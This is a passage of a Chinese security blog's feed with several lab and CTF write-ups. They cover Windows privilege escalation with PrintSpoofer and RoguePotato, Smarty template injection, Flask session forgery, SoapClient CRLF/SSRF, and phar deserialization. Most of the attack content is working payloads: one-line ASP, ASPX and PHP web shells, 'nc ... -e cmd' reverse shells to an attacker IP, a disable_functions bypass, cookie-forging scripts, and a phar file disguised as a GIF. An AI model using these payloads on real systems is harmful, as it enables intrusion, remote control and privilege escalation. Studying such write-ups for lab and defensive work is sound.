    <published>2020-05-14T11:12:23.000Z</published>
    <updated>2020-05-14T11:39:12.605Z</updated>
    
    <content type="html"><![CDATA[<p>1.搭建一个iis服务器 写上一句话</p><p> &lt;%eval request(“a”)%&gt;</p><p> 蚁剑连接</p><p><img src="/Elevation/2/1.png" alt></p><p>提权前提  需要有SeImpersonatePrivileg这个权限</p><p><img src="/Elevation/2/2.png" alt></p><p>然后编译exp  编译完成后中上传到靶机中 并执行 可能出现以下问题</p><p> vcruntime140d.dll丢失</p><p> 然后修改为选项就可以了</p><p><img src="/Elevation/2/3.png" alt></p><p>经过多次编译 发现目标机无法执行成功exp</p><p><img src="/Elevation/2/4.png" alt></p><p><img src="/Elevation/2/5.png" alt></p><p>发现版本有限制…</p><p> From LOCAL/NETWORK SERVICE to SYSTEM by abusing SeImpersonatePrivilege on Windows 10 and Server 2016/2019</p><p> 放在win10上就成功了</p><p>aspx一句话:&lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[“a”],”unsafe”);%&gt;</p><p><img src="/Elevation/2/6.png" alt></p><p>拓展下 反弹shell</p><p>PrintSpoofer.exe -c “C:\inetpub\wwwroot\nc.exe 192.168.0.104 8888 -e cmd”</p><p><img src="/Elevation/2/7.png" alt></p><p>生成系统进程 Spawn a SYSTEM process on a desktop</p><p> PrintSpoofer.exe -d 3 -c “powershell -ep bypass”</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;1.搭建一个iis服务器 写上一句话&lt;/p&gt;
&lt;p&gt; &amp;lt;%eval request(“a”)%&amp;gt;&lt;/p&gt;
&lt;p&gt; 蚁剑连接&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/Elevation/2/1.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;提权前提  需要有SeImpersona
      
    
    </summary>
    
    
      <category term="Elevation" scheme="http://perthinking.xyz/categories/Elevation/"/>
    
    
  </entry>
  
  <entry>
    <title>Windows-RoguePotato  提权</title>
    <link href="http://perthinking.xyz/Elevation/1/"/>
    <id>http://perthinking.xyz/Elevation/1/</id>
    <published>2020-05-14T10:52:07.000Z</published>
    <updated>2020-05-14T11:39:27.990Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>复现下国外大佬的提权</p></blockquote><h1 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理"></a>1.原理</h1><p><a href="https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/amp/?__twitter_impression=true&amp;tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/amp/?__twitter_impression=true&amp;tdsourcetag=s_pctim_aiomsg</a></p><p> 项目源码:<a href="https://github.com/antonioCoco/RoguePotato" target="_blank" rel="noopener">https://github.com/antonioCoco/RoguePotato</a></p><h1 id="2-复现"><a href="#2-复现" class="headerlink" title="2.复现"></a>2.复现</h1><p>靶机: win10  ip:192.168.0.102</p><p>攻击机: kali ip:192.168.0.101</p><p>首先 下载源码后编译 注意是 release 编译</p><p><img src="/Elevation/1/1.png" alt></p><p>编译后如下:</p><p><img src="/Elevation/1/2.png" alt></p><p>然后将编译后的软件上传到靶机中 我是将整个文件夹上传上去</p><p> 看用法说明 应该要用到  RogueOxidResolver.exe</p><p><img src="/Elevation/1/3.png" alt></p><p>在win10开启一个iis 并上传一个执行命令的小马 在github上可以下载</p><p><img src="/Elevation/1/4.png" alt></p><p><img src="/Elevation/1/5.png" alt></p><p>访问后执行命令确保小马有用</p><p><img src="/Elevation/1/6.png" alt></p><p>然后在靶机上上传nc 并开启RPC服务  默认是开启的</p><p>在攻击机上执行命令:</p><p>socat tcp-listen:135,reuseaddr,fork tcp:192.168.0.102:9999</p><p>Nc -lvp 4444</p><p>网站shell中执行</p><p>.\RoguePotato.exe -r 192.168.0.101 -e “E:\Debug\nc64.exe 192.168.0.101 4444 -e cmd.exe” -l 9999</p><p>成功反弹shell 并获得系统权限 成功提权</p><p><img src="/Elevation/1/7.png" alt></p><p><img src="/Elevation/1/8.png" alt></p><p>然后也可以看到4444端口连接</p><p><img src="/Elevation/1/9.png" alt></p><p>还要说明的就是用户权限不能反弹shell</p><p><img src="/Elevation/1/10.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;复现下国外大佬的提权&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;1-原理&quot;&gt;&lt;a href=&quot;#1-原理&quot; class=&quot;headerlink&quot; title=&quot;1.原理&quot;&gt;&lt;/a&gt;1.原理&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://
      
    
    </summary>
    
    
      <category term="Elevation" scheme="http://perthinking.xyz/categories/Elevation/"/>
    
    
  </entry>
  
  <entry>
    <title>Soapclient+crlf+ssrf(原理)</title>
    <link href="http://perthinking.xyz/CTF/6/"/>
    <id>http://perthinking.xyz/CTF/6/</id>
    <published>2020-05-06T01:31:01.000Z</published>
    <updated>2020-05-13T08:23:33.573Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1.基础知识"></a>1.基础知识</h1><blockquote><p>引用下优秀博客的文章  <a href="https://www.cnblogs.com/JeffreySun/archive/2009/12/14/1623766.html" target="_blank" rel="noopener">https://www.cnblogs.com/JeffreySun/archive/2009/12/14/1623766.html</a></p></blockquote><img src="/CTF/6/1.png" style="zoom:60%;"><img src="/CTF/6/2.png" style="zoom:60%;"><img src="/CTF/6/3.png" style="zoom:60%;"><img src="/CTF/6/4.png" style="zoom:60%;"><img src="/CTF/6/5.png" style="zoom:60%;"><img src="/CTF/6/6.png" style="zoom:60%;"><img src="/CTF/6/7.png" style="zoom:60%;"><img src="/CTF/6/8.png" style="zoom:60%;"><p>然后再多接触下wsdl文档实例</p><h1 id="2-CRLF"><a href="#2-CRLF" class="headerlink" title="2.CRLF"></a>2.CRLF</h1><blockquote><p>引用下优秀博客的文章</p><p><a href="https://wooyun.js.org/drops/CRLF%20Injection漏洞的利用与实例分析.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/CRLF%20Injection漏洞的利用与实例分析.html</a></p></blockquote><img src="/CTF/6/9.png" style="zoom:60%;"><img src="/CTF/6/10.png" style="zoom:60%;"><img src="/CTF/6/11.png" style="zoom:60%;"><img src="/CTF/6/12.png" style="zoom:60%;"><img src="/CTF/6/13.png" style="zoom:60%;"><h1 id="3-crlf-ssrf漏洞利用"><a href="#3-crlf-ssrf漏洞利用" class="headerlink" title="3.crlf+ssrf漏洞利用"></a>3.crlf+ssrf漏洞利用</h1><p>看soapclient方法</p><img src="/CTF/6/14.png" style="zoom:60%;"><img src="/CTF/6/15.png" style="zoom:60%;"><img src="/CTF/6/16.png" style="zoom:60%;"><p>生成任意报文的POC</p><pre><code>&lt;?php$target = &#39;http://xxx/bbb.php&#39;;$post_string = &#39;a=b&amp;flag=aaa&#39;;$headers = array(  &#39;X-Forwarded-For: 127.0.0.1&#39;,  &#39;Cookie: xxxx=1234&#39;  );$b = new SoapClient(null,array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;&#39;wupco^^ContentType: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length:&#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39;   =&gt; &quot;aaab&quot;));$aaa = serialize($b);$aaa = str_replace(&#39;^^&#39;,&#39;%0d%0a&#39;,$aaa);$aaa = str_replace(&#39;&amp;&#39;,&#39;%26&#39;,$aaa);echo $aaa;?&gt;</code></pre><h1 id="4-简单运用soapclient"><a href="#4-简单运用soapclient" class="headerlink" title="4.简单运用soapclient"></a>4.简单运用soapclient</h1><h2 id="1-本地测试"><a href="#1-本地测试" class="headerlink" title="1)本地测试"></a>1)本地测试</h2><pre><code>&lt;?php$a = new SoapClient(null,array(&#39;uri&#39;=&gt;&#39;bbb&#39;, &#39;location&#39;=&gt;&#39;http://127.0.0.1:5555/path&#39;));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;not_exists_function();</code></pre><img src="/CTF/6/17.png" style="zoom:60%;"><h2 id="2-看看crlf漏洞"><a href="#2-看看crlf漏洞" class="headerlink" title="2)看看crlf漏洞"></a>2)看看crlf漏洞</h2><pre><code>&lt;?php $a = new SoapClient(null,array(&#39;uri&#39;=&gt;&quot;bbb\r\n\r\nccc\r\n&quot;, &#39;location&#39;=&gt;&#39;http://127.0.0.1:5555/path&#39;)); $b = serialize($a); echo $b; $c = unserialize($b); $c-&gt;not_exists_function();</code></pre> <img src="/CTF/6/18.png" style="zoom:60%;"><p>弹到vps试下</p> <img src="/CTF/6/19.png" style="zoom:60%;"> <img src="/CTF/6/20.png" style="zoom:60%;"> <img src="/CTF/6/21.png" style="zoom:60%;"><h2 id="3-构造请求"><a href="#3-构造请求" class="headerlink" title="3)构造请求"></a>3)构造请求</h2><pre><code>&lt;?php$target = &#39;http://39.101.184.64:5555/path&#39;;$post_string = &#39;data=something&#39;;$headers = array(  &#39;X-Forwarded-For: 127.0.0.1&#39;,  &#39;Cookie: PHPSESSID=my_session&#39;  );$b = new SoapClient(null,array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;&#39;wupco^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length:&#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39;   =&gt; &quot;aaab&quot;));$aaa = serialize($b);$aaa = str_replace(&#39;^^&#39;,&quot;\r\n&quot;,$aaa);$aaa = str_replace(&#39;&amp;&#39;,&#39;&amp;&#39;,$aaa);echo $aaa;$c = unserialize($aaa);$c-&gt;not_exists_function();?&gt;</code></pre> <img src="/CTF/6/22.png" style="zoom:60%;">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;1-基础知识&quot;&gt;&lt;a href=&quot;#1-基础知识&quot; class=&quot;headerlink&quot; title=&quot;1.基础知识&quot;&gt;&lt;/a&gt;1.基础知识&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;引用下优秀博客的文章  &lt;a href=&quot;https://www.cnblogs.
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://perthinking.xyz/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>Flask-session伪造-[CISCN2019 华东南赛区]Web4</title>
    <link href="http://perthinking.xyz/CTF/5/"/>
    <id>http://perthinking.xyz/CTF/5/</id>
    <published>2020-05-06T01:12:42.000Z</published>
    <updated>2020-05-13T08:26:36.422Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>知识点:</p><p>Flask模块</p><p>任意文件读取</p><p>伪随机数攻击</p></blockquote><h1 id="1-首先应想到它是flask模块写的py程序"><a href="#1-首先应想到它是flask模块写的py程序" class="headerlink" title="1.首先应想到它是flask模块写的py程序"></a>1.首先应想到它是flask模块写的py程序</h1><p><img src="/CTF/5/1.png" alt></p><p>修改为app.py拿到源码</p><pre><code># encoding:utf-8import re, random, uuid, urllibfrom flask import Flask, session, requestapp = Flask(__name__)random.seed(uuid.getnode())//mac地址app.config[&#39;SECRET_KEY&#39;] = str(random.random()*233)app.debug = True@app.route(&#39;/&#39;)def index():  session[&#39;username&#39;] = &#39;www-data&#39;  return &#39;Hello World! &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;&#39;@app.route(&#39;/read&#39;)def read():  try:​    url = request.args.get(&#39;url&#39;)​    m = re.findall(&#39;^file.*&#39;, url, re.IGNORECASE)​    n = re.findall(&#39;flag&#39;, url, re.IGNORECASE)​    if m or n:​      return &#39;No Hack&#39;​    res = urllib.urlopen(url)​    return res.read()  except Exception as ex:​    print str(ex)  return &#39;no response&#39;@app.route(&#39;/flag&#39;)def flag():  if session and session[&#39;username&#39;] == &#39;fuck&#39;:​    return open(&#39;/flag.txt&#39;).read()  else:​    return &#39;Access denied&#39; if __name__==&#39;__main__&#39;:  app.run(​    debug=True,​    host=&quot;0.0.0.0&quot;  )</code></pre><p>这里的考点就是利用伪随机数的攻击  替换cookie拿flag</p><p>random.seed(uuid.getnode())   设置随机种子为MAC地址</p><p>读取MAC地址   02:42:ae:01:22:f5</p><p><img src="/CTF/5/2.png" alt></p><h1 id="2-FlaskSession伪造"><a href="#2-FlaskSession伪造" class="headerlink" title="2.FlaskSession伪造"></a>2.FlaskSession伪造</h1><p><img src="/CTF/5/3.png" alt></p><p>使用这个命令安装:  pip install flask_session_cookie_manager</p><p>脚本:</p><pre><code>#!/usr/bin/env python2\# encoding:utf-8import randomimport flask_session_cookie_manager2mac = &quot;02:42:ae:01:22:f5&quot;random.seed(int(mac.replace(&quot;:&quot;, &quot;&quot;), 16))for x in range(1000):  SECRET_KEY = str(random.random() * 233)  rs = flask_session_cookie_manager2.FSCM.decode(&#39;eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.XnS_Kw.ZdBc_Fi1QVVs6xXweABU0xuzfm8&#39;, SECRET_KEY)  if &#39;error&#39; not in rs:​    print(SECRET_KEY)​    rs[u&#39;username&#39;] = &#39;fuck&#39;​    print(str(rs))​    print(flask_session_cookie_manager2.FSCM.encode(SECRET_KEY, str(rs)))​    break</code></pre><p><img src="/CTF/5/4.png" alt></p><p>得到cookie</p><p>访问flag  重置cookie即可拿到flag</p><p><img src="/CTF/5/5.png" alt></p><p><img src="/CTF/5/6.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;知识点:&lt;/p&gt;
&lt;p&gt;Flask模块&lt;/p&gt;
&lt;p&gt;任意文件读取&lt;/p&gt;
&lt;p&gt;伪随机数攻击&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;1-首先应想到它是flask模块写的py程序&quot;&gt;&lt;a href=&quot;#1-首先应想到它是flask模块
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://perthinking.xyz/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>Bypass disfuction-攻防世界smarty</title>
    <link href="http://perthinking.xyz/CTF/4/"/>
    <id>http://perthinking.xyz/CTF/4/</id>
    <published>2020-05-05T14:29:14.000Z</published>
    <updated>2020-05-13T07:26:38.381Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-if标签"><a href="#1-if标签" class="headerlink" title="1.if标签"></a>1.if标签</h1><p>首先 if标签得到phpinfo </p><p>  {if  phpinfo()}{/if}  </p><p>拿到路径</p><p><img src="/CTF/4/1.png" alt></p><p>上传一句话</p><p>{file_put_contents(‘/var/www/html/shell.php’,’&lt;?php eval($_POST[1]);’)}</p><p><img src="/CTF/4/2.png" alt></p><p><img src="/CTF/4/3.png" alt></p><p>发现路径open_basedir()限制</p><p><img src="/CTF/4/4.png" alt></p><p>也禁用了大部分函数</p><h1 id="2-bypass-disfuction"><a href="#2-bypass-disfuction" class="headerlink" title="2.bypass disfuction"></a>2.bypass disfuction</h1><p>然后就是bypass disfuction  也是linux pre_load</p><p> 原理待补</p><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p><p>上传这两个文件</p><p><img src="/CTF/4/5.png" alt></p><p>访问<a href="http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so" target="_blank" rel="noopener">http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so</a></p><p><img src="/CTF/4/6.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;1-if标签&quot;&gt;&lt;a href=&quot;#1-if标签&quot; class=&quot;headerlink&quot; title=&quot;1.if标签&quot;&gt;&lt;/a&gt;1.if标签&lt;/h1&gt;&lt;p&gt;首先 if标签得到phpinfo &lt;/p&gt;
&lt;p&gt;  {if  phpinfo()}{/if}  &lt;/p&gt;

      
    
    </summary>
    
    
      <category term="CTF" scheme="http://perthinking.xyz/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>phar反序列化(原理)</title>
    <link href="http://perthinking.xyz/CTF/3/"/>
    <id>http://perthinking.xyz/CTF/3/</id>
    <published>2020-05-05T14:05:55.000Z</published>
    <updated>2020-05-13T08:30:20.914Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-phar文件结构"><a href="#1-phar文件结构" class="headerlink" title="1.phar文件结构:"></a>1.phar文件结构:</h1><p><img src="/CTF/3/1.png" alt></p><p> metadata:</p><p><img src="/CTF/3/2.png" alt></p><p><img src="/CTF/3/3.png" alt></p><h1 id="2-生成phar文件"><a href="#2-生成phar文件" class="headerlink" title="2.生成phar文件"></a>2.生成phar文件</h1><pre><code>&lt;?php  class TestObject {  }  @unlink(&quot;phar.phar&quot;);  $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar  $phar-&gt;startBuffering();  $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub  $o = new TestObject();  $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest  $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件  //签名自动计算  $phar-&gt;stopBuffering();?&gt;</code></pre><p><img src="/CTF/3/4.png" alt></p><p>可以看到metadata序列化形式存储在phar.phar中</p><p>了解下phar伪协议</p><p><img src="/CTF/3/5.png" alt></p><p><img src="/CTF/3/6.png" alt></p><p> 测试:</p><pre><code>  class TestObject {​    public function __destruct() {​      echo &#39;Destruct called&#39;;​    }  }  $filename = &#39;phar://phar.phar&#39;;  file_get_contents($filename);</code></pre><p><img src="/CTF/3/7.png" alt></p><p>说明file_get_contents()解析phar文件时触发反序列化</p><p>也可以这样用</p><p><img src="/CTF/3/8.png" alt></p><p>原理:</p><p><img src="/CTF/3/9.png" alt></p><p><img src="/CTF/3/10.png" alt></p><p><img src="/CTF/3/10.png" alt></p><p><img src="/CTF/3/11.png" alt></p><h1 id="3-伪造成其它格式文件"><a href="#3-伪造成其它格式文件" class="headerlink" title="3.伪造成其它格式文件"></a>3.伪造成其它格式文件</h1><p>  伪造成gif</p><pre><code>  class TestObject {  }  @unlink(&quot;phar.phar&quot;);  $phar = new Phar(&quot;phar.phar&quot;);  $phar-&gt;startBuffering();  $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub，增加gif文件头  $o = new TestObject();  $phar-&gt;setMetadata($o); //将自定义meta-data存入manifest  $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件  //签名自动计算  $phar-&gt;stopBuffering();</code></pre><p><img src="/CTF/3/12.png" alt></p><h1 id="4-利用条件"><a href="#4-利用条件" class="headerlink" title="4.利用条件:"></a>4.利用条件:</h1><p><img src="/CTF/3/13.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;1-phar文件结构&quot;&gt;&lt;a href=&quot;#1-phar文件结构&quot; class=&quot;headerlink&quot; title=&quot;1.phar文件结构:&quot;&gt;&lt;/a&gt;1.phar文件结构:&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/CTF/3/1.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://perthinking.xyz/categories/CTF/"/>
    
    
  </entry>
  
</feed>
